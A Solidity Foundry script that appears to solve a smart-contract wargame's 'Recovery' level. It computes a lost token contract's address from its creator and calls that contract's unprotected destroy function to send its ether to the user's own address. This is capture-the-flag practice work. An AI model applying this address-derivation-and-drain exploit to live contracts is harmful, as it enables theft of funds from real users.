// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Recovery} from "../src/Level17.sol";

contract Level17Sol is Script{
    Recovery public recovery = Recovery(0x7b9D82e39aa30ddAf4c5a9f132F4834926107Caf);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address myAddress = address(vm.envAddress("MY_ADDRESS"));
        Attack attack = new Attack();
        console.log("Attack Address : ", address(attack));
        console.log("MY Balance : ", myAddress.balance);
        
        address _creator = address(recovery);

        address token = attack.exploit(_creator, payable(myAddress));
        
        console.log("Token Address : ", token);
        console.log("MY Balance : ", myAddress.balance);

        vm.stopBroadcast();
    }
}

contract Attack{
    function exploit(address _creator, address payable _myAddress) public returns(address){
        address missedToken = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(_creator), bytes1(0x01))))));

        missedToken.call(abi.encodeWithSignature("destroy(address)", _myAddress));

        return missedToken;
    }
}